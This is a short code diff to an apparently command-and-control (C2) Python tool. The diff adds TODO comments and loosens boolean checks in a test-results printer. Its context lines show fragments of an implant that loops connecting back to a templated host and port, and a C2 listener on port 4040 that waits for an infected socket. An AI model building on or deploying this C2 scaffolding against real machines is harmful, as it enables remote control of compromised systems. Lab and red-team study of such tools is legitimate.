@@ -110,6 +110,7 @@ HOST = '{host}'
 PORT = {port}
 
 def connect_c2():
+    # TODO: Ensure loop has proper exit condition
     while True:
         try:
             sock = socket.socket()
@@ -189,6 +190,7 @@ server.do_listen('4040')
 print("[C2] Listening on port 4040")
 
 import time
+    # TODO: Review - infinite loop may need exit condition
 while True:
     time.sleep(2)
     if hasattr(server, 'inf_sock') and server.inf_sock:
@@ -346,11 +348,11 @@ while True:
         print("\n[VALIDATION RESULTS]")
         
         total = len(self.test_results)
-        passed = sum(1 for v in self.test_results.values() if v is True)
+        passed = sum(1 for v in self.test_results.values() if v)
         
         for test, result in self.test_results.items():
-            symbol = '✓' if result is True else '✗'
-            print(f"  {symbol} {test}: {'PASS' if result is True else 'FAIL'}")
+            symbol = '✓' if result else '✗'
+            print(f"  {symbol} {test}: {'PASS' if result else 'FAIL'}")
             
         print(f"\n[SUMMARY]")
         print(f"  Tests Passed: {passed}/{total}")
